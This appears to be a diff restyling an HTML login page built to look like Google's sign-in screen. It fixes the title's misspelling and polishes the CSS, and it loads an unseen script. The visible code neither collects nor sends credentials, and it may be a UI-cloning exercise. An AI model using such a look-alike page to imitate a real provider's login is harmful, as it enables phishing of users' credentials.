@@ -3,18 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Googel login</title>
+  <title>Google Login</title>
 
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
     }
 
     body {
-      background: #f2f2f2;
+      background: linear-gradient(135deg, #eef2f7, #e6ecf5);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -26,21 +26,29 @@
     }
 
     .login-card {
-      width: 360px;
-      background: #fff;
-      padding: 40px;
-      border-radius: 8px;
-      border: 1px solid #dadce0;
+      width: 380px;
+      background: #ffffff;
+      padding: 45px 40px;
+      border-radius: 16px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+      border: 1px solid #e0e0e0;
+      transition: 0.3s ease;
+    }
+
+    .login-card:hover {
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.12);
     }
 
     .logo {
-      width: 75px;
-      margin-bottom: 20px;
+      width: 85px;
+      margin-bottom: 25px;
     }
 
     h2 {
-      font-weight: normal;
+      font-weight: 500;
       margin-bottom: 8px;
+      font-size: 22px;
+      color: #202124;
     }
 
     .subtitle {
@@ -51,38 +59,40 @@
 
     .input-group {
       position: relative;
-      margin-bottom: 20px;
+      margin-bottom: 22px;
     }
 
     .input-group input {
       width: 100%;
-      padding: 12px;
+      padding: 14px 12px;
       border: 1px solid #dadce0;
-      border-radius: 4px;
+      border-radius: 8px;
       outline: none;
       font-size: 14px;
+      transition: 0.2s ease;
     }
 
     .input-group input:focus {
       border-color: #1a73e8;
+      box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
     }
 
     .input-group label {
       position: absolute;
-      top: 12px;
+      top: 14px;
       left: 12px;
       background: #fff;
-      padding: 0 4px;
+      padding: 0 6px;
       font-size: 14px;
       color: #5f6368;
-      transition: 0.2s;
+      transition: 0.2s ease;
       pointer-events: none;
     }
 
     .input-group input:focus + label,
     .input-group input:valid + label {
       top: -8px;
-      left: 8px;
+      left: 10px;
       font-size: 12px;
       color: #1a73e8;
     }
@@ -93,7 +103,8 @@
       font-size: 13px;
       color: #1a73e8;
       text-decoration: none;
-      margin-bottom: 25px;
+      margin-bottom: 28px;
+      font-weight: 500;
     }
 
     .link:hover {
@@ -102,21 +113,30 @@
 
     .login-btn {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       background: #1a73e8;
       color: #fff;
       border: none;
-      border-radius: 4px;
+      border-radius: 8px;
       cursor: pointer;
       font-size: 14px;
+      font-weight: 500;
+      transition: 0.25s ease;
     }
 
     .login-btn:hover {
       background: #1765cc;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 18px rgba(26,115,232,0.25);
+    }
+
+    .login-btn:active {
+      transform: translateY(0);
+      box-shadow: none;
     }
 
     .footer {
-      margin-top: 20px;
+      margin-top: 25px;
     }
 
     .footer select {
@@ -124,6 +144,14 @@
       background: transparent;
       font-size: 13px;
       color: #5f6368;
+      cursor: pointer;
+    }
+
+    @media (max-width: 480px) {
+      .login-card {
+        width: 90%;
+        padding: 35px 25px;
+      }
     }
   </style>
 </head>
@@ -163,6 +191,7 @@
     </div>
 
   </div>
+
 <script src="js.js"></script>
 </body>
 </html>
